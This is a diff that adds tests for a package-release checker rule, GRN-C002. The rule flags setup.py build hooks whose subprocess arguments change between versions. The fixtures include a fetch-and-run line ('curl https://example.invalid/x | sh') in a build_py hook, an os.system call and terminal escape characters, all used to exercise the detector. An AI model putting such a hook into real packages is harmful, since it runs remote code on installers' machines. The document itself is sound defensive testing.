@@ -523,6 +523,145 @@ def test_unchanged_setup_py_hook_is_quiet() -> None:
     )
 
 
+# GRN-C002: a trusted build-time call whose arguments changed
+DOCS_HOOK = (
+    "import subprocess\nfrom setuptools import setup\nfrom setuptools.command.build_py import build_py\n\n"
+    "class BuildDocs(build_py):\n    def run(self):\n"
+    "        subprocess.call({args})\n        build_py.run(self)\n\n"
+    "setup(name='demo', cmdclass={{'build_py': BuildDocs}})\n"
+)
+
+
+def _c002(base_setup: str, cand_setup: str):
+    result = run_checks(
+        CHANGE,
+        _sdist("1.0", {**SRC, "setup.py": base_setup}),
+        _sdist("1.1", {**SRC, "setup.py": cand_setup}),
+    )
+    return [f for f in result.findings if f.rule_id == "GRN-C002"]
+
+
+def test_trusted_call_with_new_arguments_warns() -> None:
+    # The same callee, now running a shell pipeline: a name-only comparison
+    # sees nothing new. The lines moved too.
+    base = DOCS_HOOK.format(args="['make', 'docs']")
+    cand = "# build docs\n\n" + DOCS_HOOK.format(
+        args="['sh', '-c', 'curl https://example.invalid/x | sh']"
+    )
+    [f] = _c002(base, cand)
+    assert f.severity is Severity.WARN
+    assert f.title == "1.1 changes code that runs when the sdist is built"
+    assert [e.summary for e in f.evidence] == [
+        "setup.py:9 calls subprocess.call(['sh', '-c', 'curl https://example.invalid/x | sh'])"
+        " (in BuildDocs.run()), changed from subprocess.call(['make', 'docs']) at line 7 in 1.0"
+    ]
+    assert (f.evidence[0].path, f.evidence[0].line) == ("setup.py", 9)
+
+
+def test_trusted_call_moved_and_reformatted_is_quiet() -> None:
+    # Lines, the enclosing function, formatting, quotes, comments, a u prefix
+    # and keyword order don't change what the call receives.
+    base = DOCS_HOOK.format(args="['make', 'docs'], cwd='docs', shell=False")
+    cand = (
+        "import subprocess\nfrom setuptools import setup\n\n\n"
+        "def docs():\n    subprocess.call(\n        [\"make\",  u'docs'],  # html\n"
+        '        shell=False,\n        cwd="docs",\n    )\n\n'
+        "setup(name='demo')\n"
+    )
+    assert _c002(base, cand) == []
+
+
+def test_changed_keyword_value_warns() -> None:
+    base = DOCS_HOOK.format(args="'make docs', shell=False")
+    [f] = _c002(base, DOCS_HOOK.format(args="'make docs', shell=True"))
+    assert f.evidence[0].summary.startswith(
+        "setup.py:7 calls subprocess.call('make docs', shell=True) (in BuildDocs.run()), "
+        "changed from subprocess.call('make docs', shell=False) at line 7 in 1.0"
+    )
+
+
+def test_a_changed_expression_counts_as_changed() -> None:
+    # Arguments are compared as written, nothing is evaluated: a list that
+    # became a tuple, or another variable, is a change.
+    base = DOCS_HOOK.format(args="['make', 'docs']")
+    assert len(_c002(base, DOCS_HOOK.format(args="('make', 'docs')"))) == 1
+    assert len(_c002(DOCS_HOOK.format(args="cmd"), DOCS_HOOK.format(args="cmd2"))) == 1
+    # The same variable is the same argument, whatever it was assigned.
+    assert (
+        _c002(
+            "cmd = ['make']\n" + DOCS_HOOK.format(args="cmd"),
+            "cmd = ['sh']\n" + DOCS_HOOK.format(args="cmd"),
+        )
+        == []
+    )
+
+
+def test_several_calls_to_one_callee_are_matched_as_a_multiset() -> None:
+    def setup(*cmds: str) -> str:
+        body = "".join(f"subprocess.call({c})\n" for c in cmds)
+        return "import subprocess\nfrom setuptools import setup\n" + body + SETUP
+
+    docs, tests = "['make', 'docs']", "['make', 'test']"
+    base = setup(docs, tests)
+    assert _c002(base, setup(tests, docs)) == []  # reordered
+    # One changed: shown beside the trusted call nothing else matched.
+    [f] = _c002(base, setup(docs, "['make', 'test', 'upload']"))
+    assert [e.summary for e in f.evidence] == [
+        "setup.py:4 calls subprocess.call(['make', 'test', 'upload']), "
+        "changed from subprocess.call(['make', 'test']) at line 4 in 1.0"
+    ]
+    # A third call with arguments the trusted release didn't use.
+    [f] = _c002(base, setup(docs, tests, "['sh', 'x.sh']"))
+    assert [e.summary for e in f.evidence] == [
+        "setup.py:5 calls subprocess.call(['sh', 'x.sh']): 1.0 called subprocess.call "
+        "only with other arguments"
+    ]
+    # Another copy of a trusted call.
+    [f] = _c002(base, setup(docs, tests, docs))
+    assert [e.summary for e in f.evidence] == [
+        "setup.py:5 calls subprocess.call(['make', 'docs']) once more than 1.0 did "
+        "(1 such call(s) in 1.0, 2 in 1.1)"
+    ]
+    # One call dropped and the other kept: nothing new runs.
+    assert _c002(base, setup(docs)) == []
+
+
+def test_new_callee_and_changed_arguments_are_reported_together() -> None:
+    base = DOCS_HOOK.format(args="['make', 'docs']")
+    cand = "import os\n" + DOCS_HOOK.format(args="['make', 'docs', 'upload']") + "os.system('id')\n"
+    [f] = _c002(base, cand)
+    assert f.title == "1.1 adds code that runs when the sdist is built"
+    assert [e.summary for e in f.evidence] == [
+        "setup.py:8 calls subprocess.call(['make', 'docs', 'upload']) (in BuildDocs.run()), "
+        "changed from subprocess.call(['make', 'docs']) at line 7 in 1.0",
+        "setup.py:12 calls os.system",
+    ]
+
+
+def test_long_changed_arguments_keep_the_difference_in_view() -> None:
+    pad = "x" * 300
+    base = DOCS_HOOK.format(args=f"['{pad}', 'make']")
+    [f] = _c002(base, DOCS_HOOK.format(args=f"['{pad}', 'curl https://example.invalid/x']"))
+    summary = f.evidence[0].summary
+    tail = "x" * 16  # the last 20 characters the two share
+    assert f"calls subprocess.call(…{tail}', 'curl https://example.invalid/x'])" in summary
+    assert f"changed from subprocess.call(…{tail}', 'make']) at line 7" in summary
+    assert len(summary) < 300
+    # Past the recorded text the two can read the same; the line says why.
+    [f] = _c002(
+        DOCS_HOOK.format(args=f"'{pad * 4}', 'make'"),
+        DOCS_HOOK.format(args=f"'{pad * 4}', 'curl'"),
+    )
+    assert f.evidence[0].summary.endswith("(the two differ after the first 1,000 characters)")
+
+
+def test_changed_arguments_reach_the_report_as_text_not_control_characters() -> None:
+    base = DOCS_HOOK.format(args="['make']")
+    [f] = _c002(base, DOCS_HOOK.format(args="['echo', '\\x1b[2J\\u202e']"))
+    assert "\x1b" not in f.evidence[0].summary and "\u202e" not in f.evidence[0].summary
+    assert "['echo', '\\x1b[2J\\u202e']" in f.evidence[0].summary
+
+
 # GRN-C001: where a .pth lands
 def test_pth_under_the_versioned_data_folder_is_the_same_file() -> None:
     base = release(
